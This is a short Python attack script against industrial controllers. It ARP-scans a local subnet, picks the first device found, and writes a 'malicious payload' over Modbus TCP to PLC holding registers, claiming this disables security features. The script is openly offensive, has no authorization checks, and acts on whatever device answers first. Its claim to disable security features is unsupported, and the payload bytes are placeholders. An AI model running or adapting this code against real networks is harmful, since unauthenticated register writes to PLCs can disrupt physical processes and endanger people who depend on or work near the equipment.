import sys
from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp

def find_plc_ip(subnet="192.168.9.0/24"):
    """
    Scans the specified subnet to find PLCs that are running Modbus (port 502).
    Returns a list of detected IP addresses.
    """
    print("[*] Scanning for available Modbus devices in the network...")
    target_ip_range = subnet
    # Perform ARP request on the subnet
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip_range)
    answered, unanswered = srp(arp_request, timeout=2, verbose=False, retry=1)
    
    ip_list = []
    for sent, received in answered:
        ip_list.append(received.psrc)  # Append all found IP addresses
    print(f"[+] Detected devices: {ip_list}")
    return ip_list

def exploit_plc(ip_address, register_start=12288, payload=[0x00] * 10):
    """
    Exploits a Modbus-enabled PLC by overwriting memory or disabling features.
    """
    print(f"[*] Attempting connection to PLC at {ip_address}...")
    client = ModbusTcpClient(ip_address)
    if not client.connect():
        print(f"[-] Cannot connect to {ip_address}.")
        return False

    # Example: Writing to registers that might control security settings or device integrity checks.
    try:
        print("[*] Writing malicious payload to disable security features...")
        client.write_registers(register_start, payload)  # Writing payload to starting register
        print(f"[+] Exploit successful on {ip_address}.")
    except Exception as e:
        print(f"[-] Failed to execute exploit: {e}")
    finally:
        client.close()

def main():
    # Step 1: Reconnaissance - Find the PLC
    detected_ips = find_plc_ip()
    if not detected_ips:
        print("[-] No devices found on network. Exiting...")
        sys.exit(1)

    # Step 2: Target the PLC - Assumes the first discovered device
    target_ip = detected_ips[0]  # Select the first IP found
    print(f"[+] Targeting PLC at IP: {target_ip}")

    # Step 3: Exploitation
    fake_payload = [0xDE, 0xAD, 0xBE, 0xEF, 0xFA, 0xCE, 0xFE, 0xED]  # Example payload
    exploit_plc(target_ip, register_start=12288, payload=fake_payload)

if __name__ == "__main__":
    print("[*] Starting script...")
    main()